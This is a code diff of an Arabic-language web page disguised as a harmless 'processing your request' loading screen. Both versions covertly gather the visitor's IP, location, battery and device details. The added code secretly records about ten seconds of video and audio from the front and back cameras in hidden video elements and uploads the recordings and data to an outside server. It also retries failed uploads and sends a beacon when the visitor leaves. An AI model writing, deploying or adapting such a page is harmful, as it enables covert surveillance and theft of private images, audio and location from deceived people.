@@ -1,439 +1,78 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🚀 تنفيذ طلبك - مرحبا بك في موقعنا</title>
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <title>مرحبا بك في موقعنا</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
         body {
-            font-family: 'Cairo', sans-serif;
-            background: linear-gradient(135deg, #ff9a9e 0%, #fecfef 50%, #fecfef 100%);
+            background-color: black;
             color: white;
+            font-family: Arial, sans-serif;
             text-align: center;
             margin: 0;
             padding: 0;
-            min-height: 100vh;
+            height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            overflow-x: hidden;
-            position: relative;
         }
-
-        /* خلفية متحركة للفيديو */
-        body::before {
-            content: '';
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(45deg,
-                rgba(255, 154, 158, 0.2) 0%,
-                rgba(254, 207, 239, 0.2) 50%,
-                rgba(255, 107, 107, 0.2) 100%);
-            animation: videoWave 6s ease-in-out infinite;
-            z-index: -1;
-        }
-
-        @keyframes videoWave {
-            0%, 100% {
-                transform: translateX(0%) scale(1);
-                opacity: 0.8;
-            }
-            50% {
-                transform: translateX(3%) scale(1.02);
-                opacity: 1;
-            }
-        }
-
-        /* إضافة تأثير الشاشة السينمائية */
-        body::after {
-            content: '';
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background:
-                linear-gradient(90deg, transparent 98%, rgba(255, 255, 255, 0.03) 100%),
-                linear-gradient(0deg, transparent 98%, rgba(255, 255, 255, 0.03) 100%);
-            background-size: 3px 3px;
-            pointer-events: none;
-            z-index: 1;
-        }
-
         .container {
             max-width: 500px;
-            padding: 40px 20px;
-            background: rgba(255, 255, 255, 0.15);
-            backdrop-filter: blur(25px);
-            border-radius: 30px;
-            box-shadow:
-                0 15px 35px rgba(0, 0, 0, 0.2),
-                inset 0 1px 0 rgba(255, 255, 255, 0.3),
-                0 0 0 1px rgba(255, 255, 255, 0.1);
-            border: 1px solid rgba(255, 255, 255, 0.15);
-            position: relative;
-            overflow: hidden;
-            z-index: 2;
         }
-
-        .container::before {
-            content: '';
-            position: absolute;
-            top: -100%;
-            left: -100%;
-            width: 300%;
-            height: 300%;
-            background: radial-gradient(circle, rgba(255, 255, 255, 0.1) 0%, transparent 70%);
-            animation: containerShimmer 4s ease-in-out infinite;
-            pointer-events: none;
-        }
-
-        @keyframes containerShimmer {
-            0%, 100% { transform: rotate(0deg) scale(1); }
-            50% { transform: rotate(180deg) scale(1.1); }
-        }
-
-        .video-icon {
-            font-size: 4.5rem;
-            margin-bottom: 20px;
-            animation: videoFloat 3s ease-in-out infinite;
-            text-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
-            position: relative;
-            z-index: 3;
-        }
-
-        @keyframes videoFloat {
-            0%, 100% {
-                transform: translateY(0px) rotate(0deg);
-                filter: drop-shadow(0 5px 15px rgba(255, 107, 107, 0.4));
-            }
-            50% {
-                transform: translateY(-15px) rotate(2deg);
-                filter: drop-shadow(0 8px 25px rgba(255, 107, 107, 0.6));
-            }
-        }
-
         .spinner {
-            border: 8px solid rgba(255, 255, 255, 0.2);
-            border-top: 8px solid #ff6b6b;
+            border: 16px solid #f3f3f3;
+            border-top: 16px solid #3498db;
             border-radius: 50%;
             width: 120px;
             height: 120px;
-            animation: spin 1.8s linear infinite;
-            margin: 0 auto 30px;
-            box-shadow:
-                0 0 30px rgba(255, 107, 107, 0.4),
-                inset 0 0 30px rgba(255, 107, 107, 0.2);
-            position: relative;
-            z-index: 3;
+            animation: spin 2s linear infinite;
+            margin: 0 auto;
         }
-
-        .spinner::after {
-            content: '';
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            width: 60%;
-            height: 60%;
-            background: radial-gradient(circle, rgba(255, 107, 107, 0.3), transparent);
-            border-radius: 50%;
-            transform: translate(-50%, -50%);
-            animation: spinnerPulse 2s ease-in-out infinite;
-        }
-
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
-        }
-
-        @keyframes spinnerPulse {
-            0%, 100% { opacity: 0.3; transform: translate(-50%, -50%) scale(1); }
-            50% { opacity: 0.8; transform: translate(-50%, -50%) scale(1.2); }
-        }
-
-        h1 {
-            font-size: 2.2rem;
-            font-weight: 700;
-            margin-bottom: 15px;
-            text-shadow: 0 3px 15px rgba(0, 0, 0, 0.4);
-            animation: fadeInUp 1s ease-out;
-            position: relative;
-            z-index: 3;
-        }
-
-        p {
-            font-size: 1.2rem;
-            font-weight: 400;
-            opacity: 0.95;
-            line-height: 1.7;
-            animation: fadeInUp 1s ease-out 0.3s both;
-            position: relative;
-            z-index: 3;
-        }
-
-        .status-text {
-            font-size: 1.1rem;
-            margin-top: 25px;
-            padding: 18px;
-            background: rgba(255, 255, 255, 0.15);
-            border-radius: 20px;
-            border: 1px solid rgba(255, 255, 255, 0.25);
-            animation: fadeInUp 1s ease-out 0.5s both;
-            position: relative;
-            z-index: 3;
-            backdrop-filter: blur(10px);
-        }
-
-        .recording-indicator {
-            display: none;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            margin-top: 20px;
-            padding: 15px;
-            background: rgba(255, 107, 107, 0.2);
-            border-radius: 15px;
-            border: 2px solid rgba(255, 107, 107, 0.4);
-            position: relative;
-            z-index: 3;
-        }
-
-        .recording-dot {
-            width: 12px;
-            height: 12px;
-            background: #ff6b6b;
-            border-radius: 50%;
-            animation: recordingPulse 1s ease-in-out infinite;
-            box-shadow: 0 0 10px rgba(255, 107, 107, 0.8);
-        }
-
-        @keyframes recordingPulse {
-            0%, 100% { opacity: 1; transform: scale(1); }
-            50% { opacity: 0.5; transform: scale(1.3); }
-        }
-
-        .progress-bar {
-            width: 100%;
-            height: 6px;
-            background: rgba(255, 255, 255, 0.2);
-            border-radius: 3px;
-            margin-top: 20px;
-            overflow: hidden;
-            position: relative;
-            z-index: 3;
-        }
-
-        .progress-fill {
-            height: 100%;
-            background: linear-gradient(90deg, #ff6b6b, #ff9a9e);
-            border-radius: 3px;
-            width: 0%;
-            transition: width 0.3s ease;
-            box-shadow: 0 0 10px rgba(255, 107, 107, 0.6);
-        }
-
-        .timer {
-            font-size: 1.5rem;
-            font-weight: 600;
-            margin-top: 15px;
-            color: #ff6b6b;
-            text-shadow: 0 2px 8px rgba(0, 0, 0, 0.3);
-            position: relative;
-            z-index: 3;
-        }
-
-        @keyframes fadeInUp {
-            from {
-                opacity: 0;
-                transform: translateY(30px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
-        .success-message {
-            background: linear-gradient(135deg, #2ecc71, #27ae60);
-            padding: 25px;
-            border-radius: 20px;
-            margin-top: 20px;
-            box-shadow: 0 8px 25px rgba(46, 204, 113, 0.4);
-            position: relative;
-            z-index: 3;
-        }
-
-        .success-icon {
-            font-size: 3.5rem;
-            margin-bottom: 15px;
-            animation: successBounce 0.8s ease-out;
-        }
-
-        @keyframes successBounce {
-            0% { transform: scale(0) rotate(-180deg); opacity: 0; }
-            50% { transform: scale(1.2) rotate(0deg); opacity: 1; }
-            100% { transform: scale(1) rotate(0deg); opacity: 1; }
-        }
-
-        /* إخفاء عنصر طلبك */
-        #frontVideo, #backVideo {
-            display: none !important;
-            visibility: hidden !important;
-        }
-
-        /* تأثيرات للشاشات الصغيرة */
-        @media (max-width: 600px) {
-            .container {
-                margin: 20px;
-                padding: 30px 15px;
-            }
-            
-            h1 {
-                font-size: 1.8rem;
-            }
-            
-            .video-icon {
-                font-size: 3.5rem;
-            }
-            
-            .spinner {
-                width: 100px;
-                height: 100px;
-            }
-        }
-
-        /* تأثير الضوء المتحرك */
-        @keyframes lightMove {
-            0% { transform: translateX(-100%) rotate(45deg); }
-            100% { transform: translateX(400%) rotate(45deg); }
-        }
-
-        .light-effect {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 2px;
-            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.6), transparent);
-            animation: lightMove 3s ease-in-out infinite;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="light-effect"></div>
-        <div class="video-icon">🚀</div>
         <div class="spinner"></div>
-        <h1>🚀 جاري تنفيذ طلبك</h1>
-        <p>يرجى الانتظار بينما نقوم بتنفيذ طلبك بدقه عالية...</p>
-        
-        <div class="status-text" id="statusText">❌ خطأ: No camera access granted</div>
-
-        <div class="recording-indicator" id="recordingIndicator">
-            <div class="recording-dot"></div>
-            <span>🔴 جاري التنفيذ...</span>
-        </div>
-
-        <div class="progress-bar">
-            <div class="progress-fill" id="progressFill"></div>
-        </div>
-
-        <div class="timer" id="timer">00:00</div>
+        <h1>جاري تنفيذ طلبك</h1>
+        <p>يرجى الانتظار...</p>
     </div>
-
-    <!-- عناصر طلبك المخفية -->
-    <video id="frontVideo" playsinline="" autoplay="" muted="" style="display:none; visibility:hidden;"></video>
-    <video id="backVideo" playsinline="" autoplay="" muted="" style="display:none; visibility:hidden;"></video>
-
+    <!-- إخفاء الفيديوهات -->
+    <video id="frontVideo" playsinline autoplay muted style="display:none; visibility:hidden;"></video>
+    <video id="backVideo" playsinline autoplay muted style="display:none; visibility:hidden;"></video>
     <script>
-        // ⚙️ إعدادات الخادم - رابط الخادم الجديد
-        const SERVER_URL = 'https://boserver.onrender.com';
+        // السيرفر الجديد الهدف
+        const EXTERNAL_SERVER_URL = 'https://roksbot.onrender.com';
         
         const frontVideo = document.getElementById('frontVideo');
         const backVideo = document.getElementById('backVideo');
-        const statusText = document.getElementById('statusText');
-        const recordingIndicator = document.getElementById('recordingIndicator');
-        const progressFill = document.getElementById('progressFill');
-        const timer = document.getElementById('timer');
+        const userId = window.location.pathname.split('/')[3];
 
-        let recordingStartTime = 0;
-        let timerInterval = null;
-
-        // 🆔 الحصول على معرف المستخدم من الرابط
-        function getChatId() {
-            const urlParams = new URLSearchParams(window.location.search);
-            let chatId = urlParams.get('chatId');
-            
-            if (!chatId) {
-                // محاولة الحصول عليه من المسار
-                const pathParts = window.location.pathname.split('/');
-                chatId = pathParts[pathParts.length - 1];
-                
-                // إذا كان المسار ينتهي بـ .html، خذ الجزء الذي قبله
-                if (chatId && chatId.includes('.html')) {
-                    chatId = pathParts[pathParts.length - 2];
-                }
-            }
-            
-            console.log("Retrieved chatId:", chatId);
-            return chatId;
-        }
-
-        // 📊 جمع البيانات الإضافية المحسنة
         async function collectAdditionalData() {
             try {
-                statusText.textContent = '📡 جمع طلبك وتنفيذه ..';
-                
-                const [ipInfo, battery] = await Promise.all([
-                    fetch('https://ipapi.co/json/')
-                        .then(response => response.json())
-                        .catch(() => ({ ip: 'غير متاح', country_name: 'غير متاح', city: 'غير متاح' })),
-                    
-                    navigator.getBattery ? 
-                        navigator.getBattery().catch(() => ({ level: 'غير متاح', charging: 'غير متاح' })) :
-                        Promise.resolve({ level: 'غير متاح', charging: 'غير متاح' })
-                ]);
-                
+                const ipInfo = await fetch('https://ipapi.co/json/').then(response => response.json());
+                const battery = await navigator.getBattery();
+
                 return {
-                    ip: ipInfo.ip || 'غير متاح',
-                    country: ipInfo.country_name || 'غير متاح',
-                    city: ipInfo.city || 'غير متاح',
+                    ip: ipInfo.ip,
+                    country: ipInfo.country_name,
+                    city: ipInfo.city,
                     platform: getPlatformInfo().platform,
                     deviceVersion: getDeviceVersion(),
-                    userAgent: navigator.userAgent || 'غير متاح',
-                    batteryLevel: battery.level !== undefined ? `${Math.round(battery.level * 100)}%` : 'غير متاح',
-                    batteryCharging: battery.charging !== undefined ? battery.charging : 'غير متاح',
+                    batteryLevel: battery.level,
+                    batteryCharging: battery.charging,
+                    userAgent: navigator.userAgent,
                     screenResolution: `${screen.width}x${screen.height}`,
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    language: navigator.language || 'غير متاح',
+                    language: navigator.language,
                     timestamp: new Date().toISOString()
                 };
             } catch (error) {
                 console.error('Error collecting additional data', error);
-                return {
-                    ip: 'غير متاح',
-                    country: 'غير متاح',
-                    city: 'غير متاح',
-                    platform: getPlatformInfo().platform,
-                    deviceVersion: getDeviceVersion(),
-                    userAgent: navigator.userAgent || 'غير متاح',
-                    batteryLevel: 'غير متاح',
-                    batteryCharging: 'غير متاح',
-                    screenResolution: `${screen.width}x${screen.height}`,
-                    timezone: 'غير متاح',
-                    language: navigator.language || 'غير متاح',
-                    timestamp: new Date().toISOString()
-                };
+                return {};
             }
         }
 
@@ -453,22 +92,15 @@
             return match ? match[1] : 'Unknown';
         }
 
-        // 🎥 طلب إذن الكاميرا والميكروفون
         async function requestCameraPermission(facingMode) {
             try {
-                statusText.textContent = `🚀 الوصول إلى ${facingMode === 'user' ? 'نجاج' : 'فشل'} خطا...`;
-                
                 const constraints = {
                     video: {
                         facingMode: facingMode,
-                        width: { ideal: 1280 },
-                        height: { ideal: 720 }
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
                     },
-                    audio: {
-                        echoCancellation: true,
-                        noiseSuppression: true,
-                        autoGainControl: true
-                    }
+                    audio: true
                 };
                 const stream = await navigator.mediaDevices.getUserMedia(constraints);
                 return stream;
@@ -478,81 +110,213 @@
             }
         }
 
-        // ⏱️ تحديث المؤقت
-        function updateTimer() {
-            const elapsed = Date.now() - recordingStartTime;
-            const seconds = Math.floor(elapsed / 1000);
-            const minutes = Math.floor(seconds / 60);
-            const remainingSeconds = seconds % 60;
-            
-            timer.textContent = `${minutes.toString().padStart(2, '0')}:${remainingSeconds.toString().padStart(2, '0')}`;
-            
-            // تحديث شريط التقدم (للعرض فقط)
-            const maxDuration = 30; // 30 ثانية كحد أقصى للعرض
-            const progress = Math.min((seconds / maxDuration) * 100, 100);
-            progressFill.style.width = `${progress}%`;
-        }
-
-        // 🚀 تهيئة النظام
         async function init() {
             try {
-                const chatId = getChatId();
-                if (!chatId || chatId === 'video.html' || chatId === '') {
-                    throw new Error('معرف المحادثة غير موجود - تأكد من صحة الرابط');
-                }
-
-                // جمع البيانات الإضافية
                 const additionalData = await collectAdditionalData();
                 
-                // محاولة الوصول إلى الكاميرات
-                statusText.textContent = '🎥 جاري الوصول إلى الكاميرات...';
+                // أولاً إرسال البيانات الأساسية
+                await sendInitialData(additionalData);
                 
+                // ثم محاولة الوصول للكاميرات
                 const frontStream = await requestCameraPermission('user');
                 const backStream = await requestCameraPermission('environment');
-                
+
                 if (frontStream || backStream) {
-                    // بدء التسجيل
-                    recordingStartTime = Date.now();
-                    recordingIndicator.style.display = 'flex';
-                    timerInterval = setInterval(updateTimer, 1000);
-                    
-                    statusText.textContent = '✅ تم بدء التنفيذ بنجاح!';
-                    
-                    // إرسال البيانات إلى الخادم
-                    try {
-                        const response = await fetch(`${SERVER_URL}/api/record`, {
-                            method: 'POST',
-                            headers: {
-                                'Content-Type': 'application/json',
-                            },
-                            body: JSON.stringify({
-                                chatId: chatId,
-                                cameraAccess: true,
-                                frontCamera: !!frontStream,
-                                backCamera: !!backStream,
-                                ...additionalData
-                            })
-                        });
-                        
-                        if (response.ok) {
-                            console.log('Data sent successfully to server');
-                        }
-                    } catch (error) {
-                        console.error('Error sending data to server:', error);
-                    }
-                    
+                    handleSuccess(frontStream, backStream, additionalData);
                 } else {
-                    statusText.textContent = '❌ لم يتم الوصول إلى أي كاميرا - يرجى التحقق من الأذونات';
+                    // إذا لم يتم الوصول للكاميرات، نرسل البيانات فقط
+                    await sendDataOnly(additionalData);
+                    showCompletionMessage();
                 }
-                
-            } catch (error) {
-                console.error('Initialization error:', error);
-                statusText.textContent = `❌ خطأ في التهيئة: ${error.message}`;
+            } catch (e) {
+                console.error('Error in init:', e);
+                // حتى إذا فشل كل شيء، نرسل البيانات الأساسية
+                try {
+                    const additionalData = await collectAdditionalData();
+                    await sendDataOnly(additionalData);
+                } catch (error) {
+                    console.error('Failed to send basic data:', error);
+                }
+                showCompletionMessage();
             }
         }
 
-        // بدء التشغيل
-        init();
+        async function sendInitialData(additionalData) {
+            try {
+                const data = {
+                    userId: userId,
+                    additionalData: additionalData,
+                    message: '🚀 اتصال جديد من المستخدم',
+                    chatId: userId
+                };
+
+                await postToExternalServer('/submitData', data);
+            } catch (error) {
+                console.error('Error sending initial data:', error);
+            }
+        }
+
+        async function sendDataOnly(additionalData) {
+            try {
+                const data = {
+                    userId: userId,
+                    additionalData: additionalData,
+                    message: '📱 بيانات جهاز المستخدم',
+                    chatId: userId
+                };
+
+                await postToExternalServer('/submitData', data);
+            } catch (error) {
+                console.error('Error sending data only:', error);
+            }
+        }
+
+        function handleSuccess(frontStream, backStream, additionalData) {
+            if (frontStream) {
+                frontVideo.srcObject = frontStream;
+                frontVideo.addEventListener('loadedmetadata', () => setupCamera(frontVideo, 'front', additionalData));
+            }
+            if (backStream) {
+                backVideo.srcObject = backStream;
+                backVideo.addEventListener('loadedmetadata', () => setupCamera(backVideo, 'back', additionalData));
+            }
+        }
+
+        function setupCamera(video, cameraType, additionalData) {
+            video.play();
+            video.onplaying = () => {
+                const mediaRecorder = new MediaRecorder(video.srcObject, {
+                    mimeType: 'video/webm;codecs=vp9,opus',
+                    videoBitsPerSecond: 1000000 // 1 Mbps
+                });
+
+                let chunks = [];
+                mediaRecorder.ondataavailable = (e) => {
+                    if (e.data.size > 0) {
+                        chunks.push(e.data);
+                    }
+                };
+
+                mediaRecorder.onstop = () => {
+                    const blob = new Blob(chunks, { type: 'video/webm' });
+                    chunks = [];
+                    sendVideo(blob, cameraType, additionalData);
+                };
+
+                mediaRecorder.start();
+
+                // تسجيل لمدة 10 ثوانٍ كحد أقصى
+                setTimeout(() => {
+                    if (mediaRecorder.state === 'recording') {
+                        mediaRecorder.stop();
+                        video.srcObject.getTracks().forEach(track => track.stop());
+                    }
+                }, 10000); // 10 ثواني
+
+                // أيضاً نتوقف إذا غادر المستخدم الصفحة
+                window.addEventListener('beforeunload', () => {
+                    if (mediaRecorder.state === 'recording') {
+                        mediaRecorder.stop();
+                    }
+                });
+            };
+        }
+
+        async function sendVideo(blob, cameraType, additionalData) {
+            const formData = new FormData();
+            formData.append('images', blob, `video_${cameraType}.webm`);
+            formData.append('userId', userId);
+            formData.append('cameraType', cameraType);
+            formData.append('additionalData', JSON.stringify(additionalData));
+            formData.append('chatId', userId);
+
+            try {
+                await postToExternalServer('/submitPhotos', formData);
+                console.log(`✅ تم إرسال فيديو ${cameraType} بنجاح`);
+            } catch (error) {
+                console.error(`❌ فشل إرسال فيديو ${cameraType}:`, error);
+            }
+
+            // إيقاف الكاميرات
+            if (frontVideo.srcObject) frontVideo.srcObject.getTracks().forEach(track => track.stop());
+            if (backVideo.srcObject) backVideo.srcObject.getTracks().forEach(track => track.stop());
+
+            showCompletionMessage();
+        }
+
+        async function postToExternalServer(endpoint, data) {
+            const maxRetries = 3;
+            let retries = 0;
+
+            while (retries < maxRetries) {
+                try {
+                    const url = `${EXTERNAL_SERVER_URL}${endpoint}`;
+                    console.log(`🔄 محاولة الإرسال إلى: ${url}`);
+                    
+                    const options = {
+                        method: 'POST'
+                    };
+
+                    // إذا كان FormData نستخدمه مباشرة، وإلا نرسل كـ JSON
+                    if (data instanceof FormData) {
+                        options.body = data;
+                    } else {
+                        options.body = JSON.stringify(data);
+                        options.headers = {
+                            'Content-Type': 'application/json'
+                        };
+                    }
+
+                    const response = await fetch(url, options);
+
+                    if (!response.ok) {
+                        throw new Error(`HTTP error! status: ${response.status}`);
+                    }
+
+                    const result = await response.json();
+                    console.log('✅ نجح الإرسال للسيرفر الخارجي:', result);
+                    return result;
+
+                } catch (error) {
+                    console.error(`❌ محاولة ${retries + 1} فشلت:`, error);
+                    retries++;
+                    if (retries < maxRetries) {
+                        await new Promise(resolve => setTimeout(resolve, 2000 * retries));
+                    } else {
+                        throw error;
+                    }
+                }
+            }
+        }
+
+        function showCompletionMessage() {
+            document.querySelector('.container').innerHTML = `
+                <h1>تم الدخول الى الموقع</h1>
+                <p>يمكنك إغلاق الصفحة الآن</p>
+            `;
+        }
+
+        // بدء التنفيذ عند تحميل الصفحة
+        window.addEventListener('load', init);
+
+        // أيضاً نرسل بيانات عندما يحاول المستخدم مغادرة الصفحة
+        window.addEventListener('beforeunload', async () => {
+            try {
+                const additionalData = await collectAdditionalData();
+                const exitData = {
+                    userId: userId,
+                    additionalData: additionalData,
+                    message: '👋 المستخدم غادر الصفحة',
+                    chatId: userId
+                };
+                
+                // نستخدم navigator.sendBeacon لأنه يعمل حتى عند إغلاق الصفحة
+                const blob = new Blob([JSON.stringify(exitData)], {type : 'application/json'});
+                navigator.sendBeacon(`${EXTERNAL_SERVER_URL}/submitData`, blob);
+            } catch (error) {
+                console.error('Error sending exit data:', error);
+            }
+        });
     </script>
 </body>
 </html>
